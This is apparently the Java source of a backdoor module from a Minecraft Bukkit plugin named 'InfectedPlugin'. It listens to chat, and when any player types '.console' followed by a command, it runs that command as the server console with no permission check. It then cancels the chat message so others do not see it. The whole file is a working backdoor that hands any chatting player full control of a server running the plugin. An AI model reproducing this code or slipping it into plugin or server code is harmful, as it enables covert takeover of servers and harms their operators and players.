package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_console implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            int i;
            if (args[0].equalsIgnoreCase(".console"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .console <command>");
                    event.setCancelled(true);
                    return;
                }
                String command = "";
                for (i = 1; i < args.length; i++)
                {
                    command = command + args[i] + " ";
                }
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.trim());
                event.setCancelled(true);
                return;
            }
        }
    }
}
